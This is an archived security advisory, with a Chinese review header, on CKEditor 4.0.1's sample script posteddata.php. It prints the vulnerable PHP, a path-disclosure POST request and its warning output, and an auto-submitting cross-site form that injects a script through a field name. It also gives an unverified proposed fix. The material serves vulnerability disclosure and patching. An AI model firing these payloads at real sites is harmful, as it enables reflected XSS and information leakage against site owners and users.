---
source: "白阁文库 BaizeSec/bylibrary"
product: "CKEditor4 sample scripts"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "CKEditor4.0.1多个安全漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：CKEditor4.0.1 standard; PHP5.3.3/Apache2.2.16 lab; exposed samples plus visible warnings"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-7c5299f462f388f62ac5695d"
entity_id: "ve-7c5299f462f388f62ac5695d"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：CKEditor4.0.1 standard; PHP5.3.3/Apache2.2.16 lab; exposed samples plus visible warnings

代码与实验材料：Full vulnerable and proposed fixed PHP, array-warning and field-name XSS examples; endpoint asset/sample path inconsistency

来源证据范围：CKSource download, authorAkaStep, several security-site names but no exact original advisory

- **结论使用边界（1）**：CKEditor4 filed under predecessor FCKeditor; sample-script exposure not all editor installations。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：Array-to-string cast still can emit notice; proposed fix not validated; CSRF label is cross-site delivery of reflected XSS。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# CKEditor4.0.1多个安全漏洞

```
===========================================
Vulnerable Software: ckeditor 4.0.1 standard
Download: http://download.cksource.com/CKEditor/CKEditor/CKEditor%204.0.1/ckeditor_4.0.1_standard.zip
Vulns: Full Path Disclosure && XSS
===========================================
Tested On: Debian squeeze 6.0.6
Server version: Apache/2.2.16 (Debian)
Apache traffic server 3.2.0
MYSQL: 5.1.66-0+squeeze1
PHP 5.3.3-7+squeeze14 with Suhosin-Patch (cli) (built: Aug  6 2012 20:08:59)
Copyright (c) 1997-2009 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologies
with Suhosin v0.9.32.1, Copyright (c) 2007-2010, by SektionEins GmbH
===========================================
Vulnerable Code: /ckeditor/samples/assets/posteddata.php
=============SNIP BEGINS====================

root@debian:/etc/apache2/htdocs/hacker1/admin/ckeditor/samples/assets# cat posteddata.php
<!DOCTYPE html>
<?php
/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/
?>
<html>
<head>
        <meta charset="utf-8">
        <title>Sample &mdash; CKEditor</title>
        <link rel="stylesheet" href="sample.css">
</head>
<body>
        <h1 class="samples">
                CKEditor &mdash; Posted Data
        </h1>
        <table border="1" cellspacing="0" id="outputSample">
                <colgroup><col width="120"></colgroup>
                <thead>
                        <tr>
                                <th>Field&nbsp;Name</th>
                                <th>Value</th>
                        </tr>
                </thead>
<?php

if ( isset( $_POST ) )
        $postArray = &$_POST ;                  // 4.1.0 or later, use $_POST
else
        $postArray = &$HTTP_POST_VARS ; // prior to 4.1.0, use HTTP_POST_VARS

foreach ( $postArray as $sForm => $value )
{
        if ( get_magic_quotes_gpc() )
                $postedValue = htmlspecialchars( stripslashes( $value ) ) ;
        else
                $postedValue = htmlspecialchars( $value ) ;

?>
                <tr>
                        <th style="vertical-align: top"><?php echo $sForm?></th>
                        <td><pre class="samples"><?php echo $postedValue?></pre></td>
                </tr>
        <?php
}
?>
        </table>
        <div id="footer">
                <hr>
                <p>
                        CKEditor - The text editor for the Internet - <a class="samples" href="http://ckeditor.com/">http://ckeditor.com</a>
                </p>
                <p id="copy">
                        Copyright &copy; 2003-2013, <a class="samples" href="http://cksource.com/">CKSource</a> - Frederico Knabben. All rights reserved.
                </p>
        </div>
</body>
</html>


=============SNIP ENDS HERE====================


FULL Path Disclosure example: 

URL: http://hacker1.own/admin/ckeditor/samples/sample_posteddata.php
METHOD: $_POST

HEADERS:

Host: hacker1.own
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 30


$_POST DATA TO SEND:


bangbangbang[]=PATH DISCLOSURE


Result: 
Warning: htmlspecialchars() expects parameter 1 to be string, array given in /etc/apache2/htdocs/hacker1/admin/ckeditor/samples/assets/posteddata.php on line 38

Print screen: http://i076.radikal.ru/1302/84/edbe3f8f4524.png


=================================================

CSRF+XSS
<body onload="javascript:document.forms[0].submit()">
<form name="form1" method="post" action="http://hacker1.own/admin/ckeditor/samples/sample_posteddata.php" enctype="multipart/form-data">
<input type="hidden" name="<script>alert('AkaStep');</script>" id="fupl" value="SENDF"></li>
</form>

=================================================

Print Screen:  http://i062.radikal.ru/1302/e6/25ef023dd589.png


=================================================
And here is fixed version:  /ckeditor/samples/assets/posteddata.php

================SNIP BEGINS=======================
<!DOCTYPE html>
<?php
/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/
?>
<html>
<head>
  <meta charset="utf-8">
  <title>Sample &mdash; CKEditor</title>
  <link rel="stylesheet" href="sample.css">
</head>
<body>
  <h1 class="samples">
    CKEditor &mdash; Posted Data
  </h1>
  <table border="1" cellspacing="0" id="outputSample">
    <colgroup><col width="120"></colgroup>
    <thead>
      <tr>
        <th>Field&nbsp;Name</th>
        <th>Value</th>
      </tr>
    </thead>
<?php

if ( isset( $_POST ) )
  $postArray = &$_POST ;      // 4.1.0 or later, use $_POST
else
  $postArray = &$HTTP_POST_VARS ;  // prior to 4.1.0, use HTTP_POST_VARS

foreach ( $postArray as $sForm => $value )
{
  if ( get_magic_quotes_gpc() )
    $postedValue = htmlspecialchars( stripslashes((string) $value ) ) ;
  else
  $postedValue =htmlspecialchars((string) $value ) ;

?>
    <tr>
      <th style="vertical-align: top"><?php echo htmlspecialchars((string)$sForm);?></th>
      <td><pre class="samples"><?php echo $postedValue?></pre></td>
    </tr>
  <?php
}
?>
  </table>
  <div id="footer">
    <hr>
    <p>
      CKEditor - The text editor for the Internet - <a class="samples" href="http://ckeditor.com/">http://ckeditor.com</a>
    </p>
    <p id="copy">
      Copyright &copy; 2003-2013, <a class="samples" href="http://cksource.com/">CKSource</a> - Frederico Knabben. All rights reserved.
    </p>
  </div>
</body>
</html>

=============ENJOYYY====================

               KUDOSSSSSSS
=========================================
packetstormsecurity.org
packetstormsecurity.com
packetstormsecurity.net
securityfocus.com
cxsecurity.com
security.nnov.ru
securtiyvulns.com
securitylab.ru
secunia.com
securityhome.eu
exploitsdownload.com
osvdb.com
websecurity.com.ua
1337day.com
itsecuritysolutions.org

to all Aa Team + to all Azerbaijan Black HatZ
+ *Especially to my bro CAMOUFL4G3 *
To All Turkish Hackers

Also special thanks to: ottoman38 & HERO_AZE
===========================================

/AkaStep
```


---

> 来源：白阁文库 BaizeSec/bylibrary
